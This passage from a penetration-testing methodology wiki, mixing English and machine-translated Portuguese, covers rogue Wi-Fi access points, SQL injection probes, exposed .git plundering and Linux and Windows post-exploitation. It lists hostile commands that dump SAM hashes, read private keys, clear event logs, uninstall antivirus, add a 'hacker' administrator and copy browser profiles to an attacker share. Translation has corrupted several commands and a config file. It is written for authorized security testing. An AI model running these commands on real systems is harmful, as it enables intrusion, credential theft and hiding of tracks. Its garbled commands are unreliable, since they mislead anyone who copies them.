The injection test determines if your card can successfully inject wireless packets, and measures ping response times to APs. If you have two wireless cards connected, the test can also determine which specific injection attacks can be successfully executed. The basic injection test lists the APs in the area which respond to broadcast probes, and for each it performs a 30 packet test which measures the connection quality. This connection quality quantifies the ability of your card to successfully send and receive a response to the test target. The percentage of responses received gives a good indication of the link quality. 

aireplay-ng -9 wlan0

Where: 

- -9 - Injection test.
- wlan0 - the interface name

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_161.png "Arquivo:Execução de teste de penetração 161.png")

**Aircrack-ng**

Aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program. Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the Aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW approach (Pyshkin, Tews, and Weinmann). The default cracking method is PTW. 

For cracking WPA/WPA2 pre-shared keys, only a dictionary method is used. SSE2 support is included to dramatically speed up WPA/WPA2 key processing. A "four-way handshake" is required as input. For WPA handshakes, a full handshake is composed of four packets. However, Aircrack-ng is able to work successfully with just 2 packets. EAPOL packets (2 and 3) or packets (3 and 4) are considered a full handshake. 
### **Attacking the User**
The Rules of Engagment (ROE) should be validated to ensure this is in-scope before conducting any attacks against the users 
##### **Karmetasploit Attacks**
Karmetasploit é uma modificação do KARMA para integrá-lo ao Metasploit. Karmetasploit cria um ponto de acesso "maligno" funcional que fornece serviços de rede a um usuário desavisado. Os serviços que Karmetasploit fornece incluem um daemon DNS que responde a todas as solicitações, um serviço POP3, um serviço IMAP4, um serviço SMTP, um serviço FTP, alguns serviços SMB diferentes e um serviço web. Todas as pesquisas de DNS resultam no retorno do endereço IP do ponto de acesso, resultando em um efeito de buraco negro para todo o tráfego de e-mail, web e outros tráfegos de rede. 

Para executar o Karmetasploit, use aireplay-ng para verificar se a injeção está funcionando: 

\# aireplay-ng --test [interface do monitor]

A saída do aireplay-ng deve indicar que a injeção está funcionando e que um dos pontos de acesso locais pode ser alcançado. Se cada ponto de acesso retornar 0% e a mensagem indicando que a injeção está funcionando não estiver lá, você provavelmente precisará usar um driver diferente/corrigido ou uma placa sem fio diferente. 

O Metasploit Framework não possui um módulo DHCP, portanto, um serviço DHCP de terceiros deve ser configurado e instalado. A maneira mais fácil de fazer isso é instalar o pacote “dhcpd”. No Backtrack 4 R2, o pacote é denominado "dhcpd3" ou no Backtrack 5, o pacote é denominado "dhcp3-server". 

apt-get instalar servidor dhcp3

Após a instalação do servidor DHCP, um arquivo de configuração apropriado precisa ser criado. Este arquivo normalmente é chamado de "dhcpd.conf" ou "dhcpd3.conf" e reside em /etc, /etc/dhcp ou /etc/dhcp3. O exemplo abaixo utiliza a rede 10.0.0.0/24 com o ponto de acesso configurado em 10.0.0.1. 

tempo de locação padrão 60; 

tempo máximo de locação 72; 

estilo ddns-update nenhum; 

autoritário; 

recurso de log local7; 

sub-rede 10.0.0.0 máscara de rede 255.255.255.0 { 

`  `intervalo 10.0.0.100 10.0.0.254; 

`  `opção roteadores 10.0.0.1; 

`  `opção servidores de nomes de domínio 10.0.0.1; 

}

Para executar o Karmetasploit, há três coisas que precisam acontecer. Primeiro, o airbase-ng deve ser iniciado e configurado como um ponto de acesso sem fio ganancioso. O exemplo a seguir sinalizará o ESSID da empresa alvo, responderá a todas as solicitações de sondagem e retransmitirá todas as sondagens como beacons por 30 segundos: 

base aérea-ng -P -C 30 -e "<COMPANY ESSID>" -v [interface do monitor]

Segundo, precisamos configurar o endereço IP da interface at0 para corresponder. 

ifconfig at0 até 10.0.0.1 máscara de rede 255.255.255.0

Terceiro, o servidor DHCP precisa ser iniciado na interface TUN/TAP "at0" criada por airbase-ng: 

dhcpd -cf /etc/dhcpd.conf at0

Finalmente, o próprio Metasploit Framework precisa ser configurado. Embora seja possível configurar cada serviço manualmente, é mais eficiente usar um arquivo de recurso com a interface msfconsole. Um arquivo de recurso de amostra, configurado para usar 10.0.0.1 como endereço do ponto de acesso, com quase todos os recursos habilitados, pode ser baixado aqui [\[2\]](http://digitaloffense.net/tools/karma.rc) . Para usar esse arquivo de recursos, execute msfconsole com o parâmetro -r. Lembre-se de que o msfconsole deve ser executado como root para que os serviços de captura funcionem. 

msfconsole -r karma.rc

Depois que o Metasploit Framework processar os comandos no arquivo de recursos, o shell msfconsole padrão estará disponível para comandos. À medida que os clientes se conectam ao ponto de acesso e tentam acessar a rede, os módulos de serviço farão o que puderem para extrair informações do cliente e explorar as vulnerabilidades do navegador. 
##### **Solicitações de DNS**
<Contribuição necessária>
##### **Bluetooth**
<Contribuição necessária>
##### **AP desonesto personalizado**
<Contribuição necessária>

- Ângulo DoS/chantagem
##### **Rede**
Um aplicativo da web envolve um servidor da web que aceita entradas e geralmente tem interface usando http(s). O objetivo do testador de penetração é descobrir quaisquer pontos de interação que possam ser manipulados para acessar informações, funcionalidades ou serviços além do uso pretendido das aplicações web. Muitas vezes, um aplicativo da web é composto por camadas. As camadas geralmente são divididas em web, aplicativos e dados. Essas camadas podem ser executadas em um ou mais servidores e qualquer uma das camadas pode ter balanceamento de carga em vários servidores. Na busca para encontrar todos os pontos de entrada, durante a fase de coleta de inteligência e análise de vulnerabilidades, o testador de penetração utilizará principalmente solicitações GET e POST, mas também deverá testar head, put, delete, trace, options, connect e patch. O objetivo é mapear todos os pontos de entrada e saída. Estes não se limitam a simples formulários em uma página, mas incluem cookies, links, formulários ocultos, parâmetros http, etc. Durante a exploração, atenção especial deve ser dada a sessões, cookies, páginas de erro, códigos de status http, páginas acessíveis indiretamente, criptografia uso e configuração do servidor, uso de cache de DNS e proxy. Idealmente, isso será feito usando métodos automatizados e manuais para descobrir possíveis maneiras de manipular os parâmetros ou a lógica do aplicativo da web. Isso geralmente é feito usando alguma forma de aplicativo cliente (navegador) e um proxy que pode ficar entre o aplicativo cliente e o aplicativo da web, e uma ferramenta para rastrear (também conhecida como spider) por meio de links de páginas. 
###### **Injeção SQL (SQLi)**
According to OWASP (<https://www.owasp.org/index.php/SQL_Injection>) SQL Injection, or as it is more commonly known SQLi, consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. 

SQL (Structured Query Language) is an interpretted programming language for interfacing with a database. It is sometimes also lazily used to refer to the database management system. Applications utilize a database to store/retrieve and process information. The database is usually a relational database, where data is stored in one more tables, each table has values in one or more columns (data types/attributes) and rows (element/tuple). There are several implementations of SQL and each has their own commands and syntax. A few common commands are: select - retrieve data union - combine results of two or more selects insert - add new data update - modify existing data delete - delete data 


What is injection? Simply stated, SQL injection exploits a vulnerability that allows data sent to an application to be interpreted and run as SQL commands. 

According to OWASP (<https://www.owasp.org/index.php/SQL_Injection>) SQL Injection, also known as SQLi, consists of insertion or "injection" of a SQL query via the input data from the client to the application. 

A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. SQL injection is typically discovered in the Vulnerability Analysis phase (and maybe hinted at in the intelligence gathering phase) of the engagement. 

Uma maneira possível de testar a injeção de SQL é inserir um ' nos campos de entrada e comparar a resposta do aplicativo com uma solicitação bem formada. Se o aplicativo Web for vulnerável ao SQLi, um ' poderá retornar resultados diferentes quando a instrução SQL tentar ser executada. Foi retornada uma mensagem de erro, resultados diferentes, página da web com tamanho diferente, códigos HTTP diferentes retornados. Não se esqueça de olhar a fonte, não apenas o que é exibido no navegador. Dependendo da reação, pode ser necessário utilizar outros testes para injeção, por exemplo " ou '; ou ) ou '+"=' ou %27%20or%201=1. Também pode ser necessário codificar os caracteres para ignorar os filtros. Se o acesso ao código-fonte do aplicativo estiver disponível, revise quaisquer variáveis ​​onde a entrada possa ser manipulada como parte do uso do aplicativo. Em alguns casos isso será facilmente aparente, por exemplo php $sql = "SELECT \* from [table] WHERE tuple = '$\_GET("input"]'"; c# $sql = "SELECT \* from [table] WHERE tuple = '" + request.getParameter("input") = "'"; 

Diversas ferramentas estão disponíveis para a identificação e exploração do SQLi 

Diversas ferramentas estão disponíveis para identificação e exploração do SQLi. Ferramentas SQLi 

- Havij ( <http://itsecteam.com/en/projects/project1.htm> )
- SQLmap ( [http://sqlmap.sourceforge.net](http://sqlmap.sourceforge.net/) )
- A toupeira ( <http://sourceforge.net/projects/themole> )
- Pangolim ( <http://nosec.org/en/productservice/pangolin> )
###### **XSS**
<Contribuição necessária>
###### **CSRF**
<Contribuição necessária>
##### **Redes Ad Hoc**
<Contribuição necessária>

- Vazamento de informação
##### **Desvio de detecção**
<Contribuição necessária>

- Evasão FW/WAF/IDS/IPS
- Evasão Humana
- Evasão DLP
##### **Resistência dos controles a ataques**
<Contribuição necessária>
##### **Tipo de ataque**
<Contribuição necessária>

- Lado do cliente
- Phishing (com pretexto)
- Lado do serviço
- Fora da banda
- Pós-exploração
- Análise de infraestrutura
##### **O kit de ferramentas do engenheiro social**
O Social-Engineering Toolkit (SET) é um conjunto de ferramentas personalizadas baseado em python que se concentra exclusivamente em atacar o elemento humano do pentesting. Seu principal objetivo é aumentar e simular ataques de engenharia social e permitir que o testador teste efetivamente como um ataque direcionado pode ter sucesso. Atualmente, o SET tem dois métodos principais de ataque: um é utilizar cargas úteis do Metasploit e ataques baseados em Java, configurando um site malicioso (que você pode clonar o que quiser) que, em última análise, entrega sua carga útil. O segundo método é através de bugs no formato de arquivo e phishing de e-mail. O segundo método suporta seu próprio open-mail relay, um sendmail open-relay personalizado ou integração com o Gmail para entregar suas cargas por e-mail. O objetivo do SET é conscientizar sobre o vetor de ataque frequentemente esquecido da engenharia social. Você pode ver [tutoriais detalhados aqui](http://www.secmaniac.com/tutorials/) ou baixando o [manual do usuário aqui](http://svn.secmaniac.com/social_engineering_toolkit/readme/User_Manual.pdf) . 
### **Detecção de VPN**
VPN Hunter ( [http://www.vpnhunter.com](http://www.vpnhunter.com/) ) descobre e classifica VPNs SSL dos principais fornecedores, incluindo Juniper, Cisco, Palo Alto, Citrix, Fortinet, F5, SonicWALL, Barracuda, Microsoft e Array. O VPN Hunter também tentará detectar se a autenticação de dois fatores está habilitada nas VPNs SSL de destino. 
### **Detecção de rotas, incluindo rotas estáticas**
<Contribuição necessária>
##### **Protocolos de rede em uso**
<Contribuição necessária>
##### **Proxies em uso**
<Contribuição necessária>

- Nível de rede
- Nível de aplicação
##### **Layout de rede**
<Contribuição necessária>

- Mapeando a conectividade dentro/fora de cada segmento
- Conectividade lateral
##### **Alvos de alto valor/perfil**
<Contribuição necessária>
### **Pilhagem**
<Contribuição necessária>
#### **Câmeras de vídeo**
<Contribuição necessária>
#### **Exfiltração de dados**
<Contribuição necessária>

- identificar servidores web
- identificar servidores FTP
- Túneis DNS e ICMP
- Canais VoIP
- Canais físicos (impressão, coleta de lixo, correio)
- Fax (em impressoras multifuncionais)
#### **Localizando compartilhamentos**
<Contribuição necessária>
#### **Captura de áudio**
<Contribuição necessária>

- VoIP
- Microfone

#### **Arquivos de alto valor**
<Contribuição necessária>
#### **Enumeração de banco de dados**
<Contribuição necessária>

- Verificando PPI
- dados do cartão
- senhas/contas de usuário
#### **Wi-fi**
<Contribuição necessária>

- Roubar chaves wifi
- Adicione novas entradas Wifi com maior preferência e configure o AP para forçar 
  a conexão
- Verifique ESSIDs para identificar locais visitados
#### **Repositórios de código-fonte**
<Contribuição necessária>

- SVN
- CVS
- MS Sourcesafe
- WebDAV
#### **Git**
Git é um sistema de controle de versão distribuído (DVCS) e o metadiretório (.git) contém todas as informações necessárias para recriar o estado do repositório em qualquer momento. 

Git é frequentemente usado para implantar aplicativos da web e o metadiretório .git às vezes está disponível para pilhagem. 


**Identifique o repositório**

Uma maneira rápida de encontrar o repositório é procurar o arquivo <http://example.com/.git/HEAD> e ver se ele contém uma correspondência com ^ref: refs/ W3AF ( <http://w3af.sourceforge.net/> ) contém um plugin de descoberta chamado findGit.py que ajudará a encontrar repositórios git de alvos da web. 

Nota: o diretório .git nem sempre está presente na raiz, mas às vezes em subdiretórios dependendo de como uma parte do aplicativo é implantada. Algo como <http://example.com/blog/.git/>


**Clonando o repositório**

clone do git http://example.com/

Se um erro como esse for resultado da tentativa de clonagem, você terá que recorrer à pilhagem de diferentes maneiras, pois o repositório não é facilmente clonável. 

fatal: http://example.com/info/refs não encontrado: você executou git update-server-info no servidor?


**Verifique a navegação no diretório**

Se a navegação no diretório estiver aberta para <http://example.com/.git/objects> , o wget poderá ser usado para baixar o repositório e depois reconstruí-lo. 

Exemplo: 

`    `wget -m —no-parent http://example.com/.git 

`    `cd example.com 

`    `git reset —hard

**Outros dados úteis**

Se ambos os cenários não conseguirem obter o conteúdo do repositório git, ainda há outras informações que podem ser valiosas. Esses arquivos com nomes previsíveis podem conter informações muito úteis e são detalhados abaixo. 

- .git/index

“O índice é um arquivo binário (geralmente mantido em .git/index) contendo uma lista ordenada de nomes de caminhos, cada um com permissões e o SHA1 de um objeto blob; git ls-files pode mostrar o conteúdo do índice:” ( <http://book.git-scm.com/7_the_git_index.html> ) 

1. Detalhes da plataforma (.php, .cgi, etc)
1. Arquivos que podem conter detalhes de configuração (que não são renderizados)
1. .velho
1. .novo
1. .bak
1. .tar.gz
1. .TXT
1. Database dumps .sql

`    `mkdir example.com

`    `cd example.com

`    `mkdir .git

`    `wget get http://example.com/.git/index -O .git/index

`    `git init .

`    `git ls-files

- .git/config

Contains repo locations, usernames / email addresses, possibly other targets one could attack. 

- .git/logs/HEAD

Contains commit messages if any editing and committing has been done on the server. 

- .git/hooks/\*

There are a number of files in the hooks directory that may contain sensitive information depending on the environment. 
#### **Identify custom apps**
<Contribution Needed>
#### **Backups**
<Contribution Needed>

- Locally stored backup files
- Central backup server
- Remote backup solutions
- Tape storage
### **Business impact attacks**
<Contribution Needed>

- What makes the biz money
- Steal It
### **Further penetration into infrastructure**
<Contribution Needed>

- Botnets
#### **Pivoting inside**
- Linux Commands

--Show users that have used ssh to connect to this host. grep publickey /var/log/secure\*|awk '{print $9"\t"$11"\t"$NF}'|sort -u 

user1 ::ffff:10.0.0.1 ssh2 user2 ::ffff:10.0.0.2 ssh2 user3 ::ffff:10.0.0.3 ssh2 


--Show users that have used sudo. grep sudo /var/log/secure\*|awk -F: '{print $4}'|sort -u 

user1 root user2 user4 


--Show users with active cron use. cat /var/log/cron\* |awk '$6 !~ /Updated/ {print $6}'|tr -d \(\)|sort -u 

root user5 user1 user2 


--Look at a users password settings. passwd -S user 

1. passwd -S appuser

Password locked. 

1. passwd -S root

Password set, MD5 crypt. 

1. passwd -S bin

Alternate authentication scheme in use. 


--Users that have connected and from where. for i in $(ls /var/log/wtmp\*);do last -adf ${i}|awk '$1 !~ /wtmp/ {print $1,$NF}'|sort -u; done 

user1 testhost.example.com root testhost2.example.com user2 prodhost.example.com 


--Who is logged in right now and from where. $ who -Hu NAME LINE TIME IDLE PID COMMENT user1 pts/0 Jun 2 10:39 . 28001 (testhost.example.com) 


--Pull IPv4 hosts from /etc/hosts, drop commented entries and localhost. egrep -v "^[ \t]\*#|^[ \t]\*$|localhost" /etc/hosts 10.0.0.1 testhost.example.com testhost 10.0.0.2 testhost2.example.com testhost2 10.0.0.3 testhost3.example.com testhost3 


--Pull commented IPv4 hosts from /etc/hosts egrep "^[ \t]\*#+[ \t]\*([0-9]{1,3}\.){3}[0-9]{1,3}" /etc/hosts 

1. 10.0.0.4 testhost4.example.com testhost4


--Pull IPv6 hosts from /etc/hosts egrep "(([:xdigit:]{0,4})\:?\:{1}){0,7}\:?\:{1}([:xdigit:]{0,4})?" /etc/hosts 

1 loopback localhost # loopback (lo0) name/address

1FFF ipv6test.example.com ipv6test


--Pull hostnames from known\_hosts files for any user home you have access to read. for i in $(awk -F: '{print $6}' /etc/passwd|sort -u); do awk '{print $1}' ${i}/.ssh/known\_hosts 2> /dev/null;done|tr ',' '\n'|sort -u testhost testhost3 testhost4 ipv6test prodhost 


--Show private keys and if they are encrypted for i in $(grep "PRIVATE" \*|egrep -v "END"|awk -F: '{print $1}'); do print ${i};grep ENCRYPTED ${i};echo;done id\_dsa 

id\_dsap Proc-Type: 4,ENCRYPTED 

id\_rsa32k Tipo de procedimento: 4, CRIPTOGRAFADO 

id\_rsa512 

id\_rsa512p Tipo de procedimento: 4, ENCRYPTED 


--Olhe as chaves públicas e extraia seu tipo. Os tipos numéricos são protocolo SSH 1. for i in $(ls \*.pub);do print ${i};awk '{print $1}' ${i};echo;done id\_dsa.pub ssh-dss 

id\_dsap.pub ssh-dss 

id\_rsa16k.pub ssh-rsa 

id\_rsadef.pub ssh-rsa 

identidade2048.pub 2048 

identidade768p.pub 768 

identidade864.pub 864 

- Comandos do Windows
- Roubo e reutilização de tokens
- Quebra de senha
- Conexões Wi-Fi para outros dispositivos
- Reutilização de senha
- Registradores de teclas
- Enumeração de usuários
- Do Windows DC ou de máquinas individuais
- Arquivo de senha do Linux
- Usuários de autenticação do MSSQL Windows
##### **Histórico/Registros**
Linux 

|date|Exibir data e hora |
| :- | :- |
|df |Exibir espaço livre em disco |
|iostat |Estatísticas de E/S do kernel |
|netstat|Status e taxa de transferência da rede |
|lsof|Lista de arquivos abertos |
|ps|Processo de informação |
|top|Exibir e atualizar informações classificadas do processo |
|who|<p>Exibir quem está no sistema </p><p>Verifique o arquivo de hosts conhecidos do ssh <br>Arquivos de log para ver quem se conecta ao servidor </p>|

.bash\_history e outros arquivos de histórico do shell syslog 


MySQL 

- História do MySQL
- registro de sistema

janelas 

- Registros de eventos
- Arquivos abertos recentemente
- Navegadores
- Favoritos
- senhas armazenadas
- cookies armazenados
- histórico de navegação
- arquivos de cache do navegador
- registro de sistema
#### **Limpar**
<Contribuição necessária>

- Garanta etapas documentadas de exploração
- Garanta uma limpeza adequada
- Remover dados de teste
- Não deixe nenhum rastro
- Arquivamento e criptografia adequados de evidências a serem devolvidas ao cliente
- Restaure o banco de dados do backup quando necessário
### **Persistência**
<Contribuição necessária>

1\. Malware de inicialização automática 

2\. Conexões reversas 

3\. Rootkits 

- Modo de usuário
- Baseado em Kernel

4\. Meio C&C (http, dns, tcp, icmp) 

5\. Portas dos fundos 

6\. Implantes 

7\. VPN com credenciais 
## **Pós-exploração**
As atividades pós-exploração são aquelas realizadas quando o sistema é comprometido. Essas atividades variam de acordo com o tipo de sistema operacional. Eles podem desde executar um simples "whoami" até enumerar contas locais. 
### **Exploração pós-Windows**
#### **Arquivos cegos**
(Coisas a serem extraídas quando tudo o que você pode fazer é ler cegamente) LFI/travessia de diretório (s). Arquivos que terão o mesmo nome em redes/domínios/sistemas do Windows.

|**Arquivo** |**Conteúdo/Descrição Esperado** |
| :- | :-: |
|%SYSTEMDRIVE%\boot.ini|Um arquivo com o qual se pode contar que estará em praticamente todos os hosts do Windows. Ajuda na confirmação de que uma leitura está acontecendo. |
|%WINDIR%\win.ini|Este é outro arquivo a ser procurado se boot.ini não estiver lá ou voltar, o que às vezes é o caso. |
|<p>%SYSTEMROOT%\repair\SAM </p><p>%SYSTEMROOT%\System32\config\RegBack\SAM</p>|Ele armazena as senhas dos usuários em formato hash (em hash LM e hash NTLM). |
|<p>%SYSTEMROOT%\repair\system </p><p>%SYSTEMROOT%\System32\config\RegBack\system</p>||
#### **Execução de comandos não interativos**

|||
| :- | :-: |
|||
#### **Sistema**

|**Comando** |**Resultado ou descrição esperada** |
| :- | :-: |
||Lista seu usuário atual. Não está presente em todas as versões do Windows; entretanto, estará presente no Windows NT 6.0-6.1. |
|whoami /all|Lista o usuário atual, sid, grupos dos quais o usuário atual é membro e seus sids, bem como o nível de privilégio atual. |
|set|Mostra todas as variáveis ​​ambientais atuais. Os específicos a serem procurados são USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA e ALLUSERPROFILE. |
|fsutil fsinfo drives|Deve ser um administrador para executar isso, mas lista as unidades atuais no sistema. |
|reg query HKLM /s /d /f "C:\\* \*.exe" | find /I "C:\" | find /V """"|Localiza executáveis ​​registrados de forma insegura no registro do sistema no Windows 7. |
#### **Rede (ipconfig, netstat, net)**

|**Comando** |**Resultado ou descrição esperada** ||
| :-: | :-: | :- |
|ipconfig /all|Exibe as informações completas sobre suas NICs. ||
|ipconfig /displaydns|Exibe seu cache DNS local. ||
|netstat -nabo|||
|netstat -s -p [tcp|udp|icpm|ip]|||
|netstat -r|||
|netstat -na | findstr :445|||
|netstat -nao | findstr LISTENING|XP e superior para sinalizador -o para obter acesso PIDnet ||
|netstat -nao | findstr LISTENING|XP and up for -o flag to get PID ||
|netstat -na | findstr LISTENING|||
|netsh diag show all|||
|net view|Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup. ||
|<p>net view /domain </p><p>net view /domain:otherdomain</p>|||
|net user %USERNAME% /domain|Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership ||
|net user /domain|Lists all of the domain users ||
|net accounts|Prints the password policy for the local system. This can be different and superseded by the domain policy. ||
|net accounts /domain|Prints the password policy for the domain ||
|net localgroup administrators|Prints the members of the Administrators local group ||
|net localgroup administrators /domain|As this was supposed to use localgroup & domain, this actually another way of getting \*current\* domain admins ||
|net group “Domain Admins” /domain|Prints the members of the Domain Admins group ||
|net group “Enterprise Admins” /domain|Prints the members of the Enterprise Admins group ||
|net group “Domain Controllers” /domain|Prints the list of Domain Controllers for the current domain ||
|nbtstat -a [ip here]|||
|net share|Displays your currently shared SMB entries, and what path(s) they point to ||
|find / “\\” |||
|arp -a|Lists all the systems currently in the machine’s ARP table. ||
|route print|Prints the machine’s routing table. This can be good for finding other networks and static routes that have been put in place ||
|browstat |Not working on XP ||
<http://www.securityaegis.com/ntsd-backdoor/>
#### **Configs**

|**Command** |**Expected Output or Description** |
| :-: | :-: |
|gpresult /z|Extremely verbose output of GPO (Group policy) settings as applied to the current system and user |
|sc qc||
|sc query||
|sc queryex||
|type %WINDIR%\System32\drivers\etc\hosts|Print the contents of the Windows hosts file |
|dir %PROGRAMFILES%|Prints a directory listing of the Program Files directory. |
|echo %COMSPEC%|Usually going to be cmd.exe in the Windows directory, but it’s good to know for sure. |
#### **Finding Important Files**

|**Command** |**Expected Output or Description** ||
| :-: | :-: | :- |
|tree C:\ /f /a > C:\output\_of\_tree.txt|Prints a directory listing in ‘tree’ format. The /a makes the tree printed with ASCII characters instead of special ones and the /f displays file names as well as folders ||
|dir /a|||
|dir /b /s [Directory or Filename]|||
|dir \ /s /b | find /I “searchstring”|Searches the output of dir from the root of the drive current drive (\) and all sub drectories (/s) using the ‘base’ format (/b) so that it outputs the full path for each listing, for ‘searchstring’ anywhere in the file name or path. ||
|command | find /c /v “”|Counts the lines of whatever you use for ‘command’ ||
#### **Files To Pull (if possible)**

|**File location** |**Description / Reason** ||
| :-: | :-: | :- |
|%SYSTEMDRIVE%\pagefile.sys|Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size ||
|%WINDIR%\debug\NetSetup.log|||
|%WINDIR%\repair\sam|||
|%WINDIR%\repair\system|||
|%WINDIR%\repair\software|||
|%WINDIR%\repair\security|||
|%WINDIR%\iis6.log |iis5.log, ii6.log or iis7.log ||
|%WINDIR%\system32\logfiles\httperr\httperr1.log|IIS 6 error log ||
|%SystemDrive%\inetpub\logs\LogFiles|IIS 7’s logs location ||
|%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log |Year month day ||
|%WINDIR%\system32\config\AppEvent.Evt|||
|%WINDIR%\system32\config\SecEvent.Evt|||
|%WINDIR%\system32\config\default.sav|||
|%WINDIR%\system32\config\security.sav|||
|%WINDIR%\system32\config\software.sav|||
|%WINDIR%\system32\config\system.sav|||
|%WINDIR%\system32\CCM\logs\\*.log|||
|%USERPROFILE%\ntuser.dat|||
|%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat|||
|%WINDIR%\System32\drivers\etc\hosts|||
#### **Remote System Access**

|**Command** |**Description / Reason** |
| :-: | :-: |
|net share \\computername||
|tasklist /V /S computername||
|qwinsta /SERVER:computername||
|qprocess /SERVER:computername \*||
|net use \\computername|This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed |
|net use \\computername /user:DOMAIN\username password|<p>Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system. </p><p>This is useful when you’ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on. </p>|
|reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f|Enable remote desktop. |
|reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG\_DWORD /d 1 /f|Enable remote assistance |
|net time \\computername |Shows the time of target computer) |
|dir \\computername\share\_or\_admin\_share\ |dir list a remote directory |
|tasklist /V /S computername|Lista tarefas com usuários executando essas tarefas em um sistema remoto. Isso removerá qualquer conexão IPC$ depois de feito, portanto, se você estiver usando outro usuário, será necessário reiniciar a montagem IPC$ |
#### **Diretórios de início automático**
ver Retorna a versão do kernel - como uname em \*nix)

|**Versão** |**Localização** |
| :-: | :-: |
|Windows NT 6.1, 6.0 |%SystemDrive%\ProgramData\Microsoft\Windows\Menu Iniciar\Programas\Inicializar\ |
|Windows NT 5.2, 5.1, 5.0 |%SystemDrive%\Documents And Settings\Todos os usuários\Menu Iniciar\Programas\StartUp\ |
|Janelas 9x |%SystemDrive%\wmiOWS\Menu Iniciar\Programas\StartUp\ |
|Windows NT 4.0, 3.51, 3.50 |%SystemDrive%\WINNT\Perfis\Todos os usuários\Menu Iniciar\Programas\StartUp\ |
#### **Plantio Binário**

|**Localização/Nome do arquivo** |**Razão/Descrição** |
| :-: | :-: |
|msiexec.exe|Idéia tirada daqui: <http://goo.gl/E3LTa> - basicamente coloque o binário maligno chamado msiexec.exe no diretório Downloads e quando um instalador chama msiexec sem especificar o caminho, você obtém a execução do código. |
|%SystemRoot%\System32\wbem\mof\|Retirado do stuxnet: <http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf> Procure a vulnerabilidade do spooler de impressão |

- WMI 
  - wmic bios
  - wmic 
  - wmic qfe get hotfixid 
    - Isso obtém IDs de patches
  - wmic startup
  - wmic service
  - wmic process 
    - Obtenha legenda, caminho executável, linha de comando
  - wmic process call create “process\_name” 
    - Executa um programa
  - wmic process where name=”process\_name” call terminate 
    - Termina o programa
  - wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber 
    - Informações do disco rígido
  - wmic useraccount 
    - Nomes de usuário, sid e vários itens relacionados à segurança
  - wmic useraccount get /ALL
  - wmic share get /ALL 
    - Você pode usar ? para obter ajuda
  - wmic startup list full 
    - Esta pode ser uma lista enorme!!!
  - wmic /node:"hostname" bios get serialnumber 
    - Isso pode ser ótimo para encontrar informações de garantia sobre o alvo

- Saída do comando Reg 
  - reg save HKLM\Security security.hive (Salve a seção de segurança em um arquivo)
  - reg save HKLM\System system.hive(Salve a seção do sistema em um arquivo)
  - reg save HKLM\SAM sam.hive(Salve Sam em um arquivo)
  - reg add [\\TargetIPaddr\] [RegDomain][ \Key ]
  - reg export [RegDomain]\[Key] [FileName]
  - reg import [FileName ]
  - reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!](você pode adicionar /s para recursar todos os valores)
#### **Excluindo registros**
wevtutil el (listar registros) 
wevtutil cl <LogName>(Limpar lowbadming específico)
del %WINDIR%\\*.log /a /s /q /f
#### **Desinstalando software “Antivírus” (não interativo)**
wmic product get name /value (isto obtém nomes de software) 
wmic product where name="XXX" call uninstall /nointeractive (isto desinstala o software) 
#### **Outro**
pkgmgr usefull /iu :”Package”
pkgmgr usefull /iu :”TelnetServer” (Instale o serviço Telnet...) 
pkgmgr /iu:”TelnetClient” (Cliente) 
rundll32.exe user32.dll, LockWorkStation (bloqueia a tela -invasiva-)
wscript.exe <script js/vbs>
cscript.exe <script js/vbs/c#>
xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\\*.sqlite \\your\_box\firefox\_funstuff
##### **Específico operacional**
###### **Win2k3**
winpop stat domainname
###### **Vista/7**
winstat features
wbadmin get status
wbadmin get items
gpresult /H gpols.htm
bcdedit /export <filename> 
###### **Vista SP1/7/2008/2008R2 (x86 & x64)**
Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):

- Note\* Works well after bypassuac + getsystem (requires system privileges)
- Note2\* For Dism.exe to work on x64 systems, the long commands are necessary

To list features which can be enabled/disabled:
%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features

To enable a feature (TFTP client for example):

%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP

To disable a feature (again TFTP client):

%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP
#### **Invasive or Altering Commands**
These commands change things on the target and can lead to getting detected 

|**Command** |**Reason / Description** |
| :-: | :-: |
|net user hacker hacker /add|Creats a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’ |
|<p>net localgroup administrators /add hacker </p><p>net localgroup administrators hacker /add</p>|Adds the new user ‘hacker’ to the local administrators group |
